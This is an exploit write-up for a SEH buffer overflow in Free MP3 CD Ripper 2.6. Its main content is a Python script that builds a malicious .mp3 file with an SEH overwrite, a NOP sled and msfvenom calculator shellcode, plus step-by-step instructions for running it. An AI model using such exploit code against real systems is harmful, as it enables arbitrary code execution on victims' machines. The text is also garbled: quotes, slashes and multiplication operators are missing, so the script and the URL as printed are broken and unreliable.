# Exploit Title Free MP3 CD Ripper 2.6 - '.mp3' Buffer Overflow (SEH)

## Author
- Gionathan John Reale

## Discovery Date
- September 13, 2018

## Software Link
- [Free MP3 CD Ripper Download](httpwww.commentcamarche.netdownloadtelecharger-34082200-free-mp3-cd-ripper)

## Tested Version
- 2.6

## Tested on OS
- Windows 7 32-bit

## Description
Free MP3 CD Ripper version 2.6 is vulnerable to a buffer overflow in its handling of `.mp3` files, which can be exploited to overwrite the SEH (Structured Exception Handling) chain. This exploit can be used to execute arbitrary code when the application processes a specially crafted `.mp3` file.

## Steps to Reproduce
1. Run the provided Python exploit script to generate a malicious `exploit.mp3` file.
2. Start Free MP3 CD Ripper.
3. Click on Convert and then open the generated `exploit.mp3` file.
4. The exploit will trigger and should cause the calculator to pop up.

## Python Exploit Script
```python
#!usrbinpython  

buffer = A  4116

NSEH = xebx06x90x90

SEH = x21x21xe4x66
nops = x90  8
#badchar x00x0ax0dx2f
#msfvenom calculator
buf =  
buf += xbax9ax98xafx7exddxc2xd9x74x24xf4x5fx29
buf += xc9xb1x31x83xc7x04x31x57x0fx03x57x95x7a
buf += x5ax82x41xf8xa5x7bx91x9dx2cx9exa0x9dx4b
buf += xeax92x2dx1fxbex1exc5x4dx2bx95xabx59x5c
buf += x1ex01xbcx53x9fx3axfcxf2x23x41xd1xd4x1a
buf += x8ax24x14x5bxf7xc5x44x34x73x7bx79x31xc9
buf += x40xf2x09xdfxc0xe7xd9xdexe1xb9x52xb9x21
buf += x3bxb7xb1x6bx23xd4xfcx22xd8x2ex8axb4x08
buf += x7fx73x1ax75xb0x86x62xb1x76x79x11xcbx85
buf += x04x22x08xf4xd2xa7x8bx5ex90x10x70x5fx75
buf += xc6xf3x53x32x8cx5cx77xc5x41xd7x83x4ex64
buf += x38x02x14x43x9cx4fxcexeax85x35xa1x13xd5
buf += x96x1exb6x9dx3ax4axcbxffx50x8dx59x7ax16
buf += x8dx61x85x06xe6x50x0exc9x71x6dxc5xaex8e
buf += x27x44x86x06xeex1cx9bx4ax11xcbxdfx72x92
buf += xfex9fx80x8ax8ax9axcdx0cx66xd6x5exf9x88
buf += x45x5ex28xebx08xccxb0xc2xafx74x52x1b
pad = B  (4440 - len(NSEH) - len(SEH) - len(buffer) - len(nops) - len(buf) )

payload = buffer + NSEH + SEH + nops + buf + pad
try
    f=open(exploit.mp3,w)
    print [+] Creating %s bytes evil payload.. %len(payload)
    f.write(payload)
    f.close()
    print [+] File created!
except
    print File cannot be created



Instructions:

Download and Install Free MP3 CD Ripper

Go to the Free MP3 CD Ripper download page.
Download the Free MP3 CD Ripper installer.
Run the installer and follow the on-screen instructions to install the software.
By default, it will be installed in C:\Program Files\Free MP3 CD Ripper.
Download and Prepare the Exploit Script

Save the following Python exploit script to a file named exploit.py.
Run the Exploit Script.

Open a command prompt.
Navigate to the directory where you saved exploit.py.
Execute the script by running: python exploit.py
his will create a file named exploit.mp3 in the same directory.
Test the Exploit

Launch the Free MP3 CD Ripper application.
Click on the "Convert" button.
Browse to and open the exploit.mp3 file that was created.
The exploit should trigger, and you should see a calculator pop up, indicating that the exploit has worked.
